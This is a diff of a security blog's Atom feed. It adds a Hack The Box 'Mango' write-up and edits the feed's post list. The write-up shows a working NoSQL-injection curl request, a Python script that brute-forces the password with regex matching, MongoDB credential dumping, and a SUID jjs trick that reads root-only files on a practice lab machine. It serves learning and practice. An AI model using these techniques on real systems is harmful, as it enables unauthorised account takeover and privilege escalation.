@@ -1,6 +1,220 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-13T22:03:43+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
-Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
-</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">VirSecCon CTF: Scripting Challenges</title><link href="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html" rel="alternate" type="text/html" title=" VirSecCon CTF: Scripting Challenges" /><published>2020-04-13T00:00:00+05:45</published><updated>2020-04-13T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/13/virseccon-ctf-scripting</id><content type="html" xml:base="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-18T16:01:09+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
+</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box: Mango</title><link href="http://localhost:4000/2020/04/18/htb-mango.html" rel="alternate" type="text/html" title="Hack The Box: Mango" /><published>2020-04-18T00:00:00+05:45</published><updated>2020-04-18T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/18/htb-mango</id><content type="html" xml:base="http://localhost:4000/2020/04/18/htb-mango.html">&lt;h1 id=&quot;htbmango&quot;&gt;HTB:Mango&lt;/h1&gt;
+
+&lt;p&gt;Mango box was the medium box. It falls under linux and medium category. Especially to get user flag was a quite difficult one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by generating the username and password of &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;user of mongodb. For root, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;jjs&lt;/code&gt; command line tool to access the root.txt file. I’ll show all my payload(including that didn’t work in initial deployment to get the root).&lt;/p&gt;
+
+&lt;h1 id=&quot;box-details&quot;&gt;Box Details&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/mango_details.png&quot; alt=&quot;mango_details&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In above picture IP was 10.10.10.162 and added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as mango.htb. Let’s solve this box.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
+
+&lt;p&gt;Let’s start with our universal port scanner, nmap to see the open port and ports &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH(22)&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP(80)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP(443)&lt;/code&gt; are opened.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Jan 21 22:10:40 2020 as: nmap -sS -sC -sV -Pn -oN nmap.txt 10.10.10.162
+Nmap scan report for 10.10.10.162
+Host is up (0.27s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 403 Forbidden
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;mango.htb&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;As soon as I saw port 80 opened I visited the site and got output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/mango_http.jpg&quot; alt=&quot;mango_http&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So seems like this site wasn’t allowed to visit so I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; of that and got a platform which was alike as google.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/mango_https.jpg&quot; alt=&quot;mango_https&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then I looked everypart of the website and got nothing useful but when I checked for certificate of that website and got &lt;code class=&quot;highlighter-rouge&quot;&gt;staging-order.mango.htb&lt;/code&gt; as new domain.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/staging_mango.png&quot; alt=&quot;staging_certificate&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;so I added that to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and on visiting that domain I found a login page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/login_page_mango.jpg&quot; alt=&quot;login_page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Everytime when I find login page I will try SQL Injection. But here box name suggest mango so database was &lt;code class=&quot;highlighter-rouge&quot;&gt;mongodb&lt;/code&gt;. To understand more about mongodb visit &lt;a href=&quot;https://medium.com/better-programming/little-bobby-collections-how-to-write-a-mongodb-injection-ad58a4e2d754&quot;&gt;here&lt;/a&gt;. Payload for mongodb requires Nosql Injection. After a lot of search I found an interesting git repo where I got the payload for Nosqli. You can find it &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now I injected NoSql Payload [$ne] in password field and it was vulnerable to NoSqli as I was redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home.php&lt;/code&gt; page i.e 302 error.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr41n73:~# curl -i -X POST http://staging-order.mango.htb/ -d &quot;username=mango&amp;amp;password[\$ne]=^&quot; -s -o /dev/null -v
+......
+&amp;lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&amp;lt; Cache-Control: no-store, no-cache, must-revalidate
+&amp;lt; Pragma: no-cache
+&amp;lt; location: home.php
+&amp;lt; Content-Length: 4022
+&amp;lt; Content-Type: text/html; charset=UTF-8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So I found the vulnerable point so I made a simple script with NoSql repo as&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Script:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import requests
+import string
+
+username = 'mango'
+password = ''
+url = &quot;http://staging-order.mango.htb/&quot;
+restart = True
+headers={'content-type': 'application/json'}
+
+while restart:
+        restart = False
+
+        for character in string.printable:
+            if character not in ['*', '+', '.', '?', '|']:
+                payload = password + character
+                post_data = {'username':username, 'password[$regex]':&quot;^&quot; + payload, 'login':'login'}
+                r = requests.post(url, data=post_data, allow_redirects=False)
+
+                if r.status_code == 302:
+                    print(payload)
+                    restart = True
+                    password = payload
+
+                    if len(password) == 16:
+                        print(&quot;\nMango password: &quot; + payload)
+
+                        exit(0)
+                    break
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This way I got the password as &lt;code class=&quot;highlighter-rouge&quot;&gt;h3mXK8RhU~f{]f5H&lt;/code&gt; which was of &lt;code class=&quot;highlighter-rouge&quot;&gt;mango&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;h2 id=&quot;unprivileged-user-to-privileged-user&quot;&gt;Unprivileged User to Privileged User&lt;/h2&gt;
+
+&lt;p&gt;Now I tried ssh into mango user with that creds I got mango shell.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr41n73:~# ssh mango@mango.htb
+The authenticity of host 'mango.htb (10.10.10.162)' can't be established.                                                                             
+ECDSA key fingerprint is SHA256:AhHG3k5r1ic/7nEKLWHXoNm0m28uM9W8heddb9lCTm0.                                                                          
+Are you sure you want to continue connecting (yes/no/[fingerprint])? uyes                                                                             
+Please type 'yes', 'no' or the fingerprint: yes                                                                                                       
+Warning: Permanently added 'mango.htb' (ECDSA) to the list of known hosts.                                                                            
+mango@mango.htb's password:                                                                                                                           
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)                                                                                    
+                                                                                                                                                      
+ * Documentation:  https://help.ubuntu.com                                                                                                            
+ * Management:     https://landscape.canonical.com                                                                                                    
+ * Support:        https://ubuntu.com/advantage                                                                                                       
+                                                                                                                                                      
+  System information as of Sat Apr 18 09:22:51 UTC 2020                                                                                               
+                                                                                                                                                      
+  System load:  0.0                Processes:            99
+  Usage of /:   25.9% of 19.56GB   Users logged in:      0
+  Memory usage: 14%                IP address for ens33: 10.10.10.162
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+122 packages can be updated.
+18 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Apr 18 07:55:54 2020 from 10.10.14.9
+mango@mango:~$ whoami
+mango
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Then I searched everypart of the shell but nothing was found over there so only thing I remind was the mongodb so I used it.&lt;/p&gt;
+
+&lt;h4 id=&quot;creds-extraction-mongodb&quot;&gt;Creds Extraction [Mongodb]&lt;/h4&gt;
+&lt;p&gt;Now to get the other users creds I searched mongo database with commands.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; show dbs
+admin   0.000GB
+config  0.000GB
+local   0.000GB
+mango   0.000GB
+&amp;gt; use mango
+switched to db mango
+&amp;gt; show tables
+users
+&amp;gt; db.getCollection(&quot;users&quot;).find()
+{ &quot;_id&quot; : ObjectId(&quot;5d8e25334f3bf1432628927b&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;t9KcS3&amp;gt;!0B#2&quot; }
+{ &quot;_id&quot; : ObjectId(&quot;5d8e25364f3bf1432628927c&quot;), &quot;username&quot; : &quot;mango&quot;, &quot;password&quot; : &quot;h3mXK8RhU~f{]f5H&quot; }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;After using &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;/&lt;code class=&quot;highlighter-rouge&quot;&gt;t9KcS3&amp;gt;!0B#2&lt;/code&gt; user/password. I got the user shell and flag.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# su admin
+Password:
+$ python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+admin@mango:/home/admin$ whoami
+admin
+admin@mango:/home/admin$ cat user.txt
+79bf31c*********************
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;Now for root part I upload a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;admin@mango&lt;/code&gt;  machine and run the script. After I lot of searched in the output of that script I found &lt;code class=&quot;highlighter-rouge&quot;&gt;SUID&lt;/code&gt; files owned by user &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@mango:/home/admin$ ./LinEnum.sh
+[-] SGID files:                                                                                                                                       
+.........
+-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jjs&lt;/code&gt; tool was owned by user &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; as it was a tool which is used to invoke the Nashorn engine. You can find detail &lt;a href=&quot;https://docs.oracle.com/en/java/javase/11/tools/jjs.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;And for exploit I usually search in &lt;a href=&quot;https://gtfobins.github.io/gtfobins/jjs/&quot;&gt;gtfobins.io&lt;/a&gt;. and I got the exploit for tool &lt;code class=&quot;highlighter-rouge&quot;&gt;jjs&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;jjs-commands&quot;&gt;jjs Commands&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@mango:/home/admin/$ echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReeader&quot;);
+&amp;gt; ^C
+eader&quot;);ngo:/home/admin$ echo 'var BufferedReader = Java.type(&quot;java.io.BufferedRe
+jjs&amp;gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);
+jjs&amp;gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);
+jjs&amp;gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));
+jjs&amp;gt; while ((line = br.readLine()) != null) { print(line); }
+8a8ef********************
+jjs&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;MrR3b00t&lt;/code&gt; for such an awesome box.&lt;/p&gt;
+
+&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;/p&gt;
+
+&lt;p&gt;Feedback are really appreciated !!&lt;/p&gt;
+
+&lt;p&gt;Tweet about this writeup if you like.&lt;/p&gt;
+
+&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="mongodb" /><category term="jjs" /><category term="Nosql" /><summary type="html">HTB:Mango</summary></entry><entry><title type="html">VirSecCon CTF: Scripting Challenges</title><link href="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html" rel="alternate" type="text/html" title=" VirSecCon CTF: Scripting Challenges" /><published>2020-04-13T00:00:00+05:45</published><updated>2020-04-13T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/13/virseccon-ctf-scripting</id><content type="html" xml:base="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Scripting is a programming language for a special run-time that automates the execution of tasks; tasks could alternatively be executed one-by-one by a human operator. We people think there is no any difference in between coding and scripting but there is a saying :-&lt;/p&gt;
 
@@ -591,20 +805,35 @@ b4,r,msb,Yx,prime   .. text: [&quot;w&quot; repeated 8 times]
 
 &lt;p&gt;&lt;img src=&quot;/public/images/ctf/virseccon_rank.jpg&quot; alt=&quot;virseccon_rank&quot; /&gt;&lt;/p&gt;
 
-&lt;h3 id=&quot;steganography&quot;&gt;&lt;a href=&quot;https://gr4n173.github.io/2020/04/07/virseccon-ctf-steganography&quot;&gt;Steganography&lt;/a&gt;:&lt;/h3&gt;
+&lt;h3 id=&quot;steganography&quot;&gt;&lt;a href=&quot;https://gr4n173.github.io/2020/04/07/virseccon-ctf-steganography.html&quot;&gt;Steganography&lt;/a&gt;:&lt;/h3&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- Stegosaurus
 	- Winter Wonderland
 	- Elessbe
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h3 id=&quot;scripting&quot;&gt;Scripting:&lt;/h3&gt;
+&lt;h3 id=&quot;scripting&quot;&gt;&lt;a href=&quot;https://gr4n173.github.io/2020/04/13/virseccon-ctf-scripting.html&quot;&gt;Scripting&lt;/a&gt;&lt;/h3&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- 2048
 	- Pincode
 	- Quick Run
 	- Grammer
 	- Loopback
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;web&quot;&gt;&lt;a href=&quot;https://gr4n173.github.io/2020/04/13/virseccon-ctf-web.html&quot;&gt;Web&lt;/a&gt;&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            - 10 Character Web Shell
+            - GET Encoded
+            - Sequelitis
+            - GLHF
+            - PHPJuggler
+            - Magician
+            - JaWT
+            - MASK
+            - Dairy Products
+            - Irregular Expressions
+            - Eyeless
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;binary&quot;&gt;Binary:&lt;/h3&gt;
@@ -627,21 +856,6 @@ b4,r,msb,Yx,prime   .. text: [&quot;w&quot; repeated 8 times]
 	- Catalias
 	- Chasm
 	- MissingCho
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;web&quot;&gt;Web&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- 10 Character Web Shell 	
-	- GET Encoded
-	- Sequelitis
-	- GLHF
-	- PHPJuggler
-	- Magician 	
-	- JaWT
-	- MASK
-	- Dairy Products
-	- Irregular Expressions 	
-	- Eyeless
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;cryptography&quot;&gt;Cryptography&lt;/h3&gt;
@@ -2323,49 +2537,4 @@ b9407e837fb****************
 Feedback are really appreciated !!&lt;br /&gt;
 Tweet about this writeup if you like.&lt;/p&gt;
 
-&lt;p&gt;You can follow and see my blog in my medium profile: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="ftp" /><category term="postgres" /><category term="rsync" /><category term="ipv6" /><category term="sqli" /><category term="rce" /><summary type="html">HTB:Zetta</summary></entry><entry><title type="html">Welcome to blog</title><link href="http://localhost:4000/2019/04/16/welcome-to-blog.html" rel="alternate" type="text/html" title="Welcome to blog" /><published>2019-04-16T00:00:00+05:45</published><updated>2019-04-16T00:00:00+05:45</updated><id>http://localhost:4000/2019/04/16/welcome-to-blog</id><content type="html" xml:base="http://localhost:4000/2019/04/16/welcome-to-blog.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
-
-&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;“This is a quote which should be followed”&lt;/p&gt;
-
-  &lt;ul&gt;
-    &lt;li&gt;Chris Wayne&lt;/li&gt;
-  &lt;/ul&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;However, these are bulletpoints:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/li&gt;
-  &lt;li&gt;another point&lt;/li&gt;
-  &lt;li&gt;that’s it&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;However, these entries should not be styled:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;an entry&lt;/li&gt;
-  &lt;li&gt;another entry&lt;/li&gt;
-  &lt;li&gt;that’s another entry&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;video preload=&quot;auto&quot; poster=&quot;https://pbs.twimg.com/tweet_video_thumb/D5aj3tfW0AIiSxo.jpg&quot; src=&quot;https://video.twimg.com/tweet_video/D5aj3tfW0AIiSxo.mp4&quot; type=&quot;video/mp4&quot; autoplay=&quot;&quot; controls=&quot;&quot;&gt;&lt;/video&gt;
-
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
-
-&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;an-interesting-fact-on-the-economy-of-modern-america&quot;&gt;An interesting fact on the economy of modern America&lt;/h1&gt;
-
-&lt;p&gt;Pictures look like this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://picsum.photos/200&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="welcome" /><category term="introduction" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>
+&lt;p&gt;You can follow and see my blog in my medium profile: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="ftp" /><category term="postgres" /><category term="rsync" /><category term="ipv6" /><category term="sqli" /><category term="rce" /><summary type="html">HTB:Zetta</summary></entry></feed>
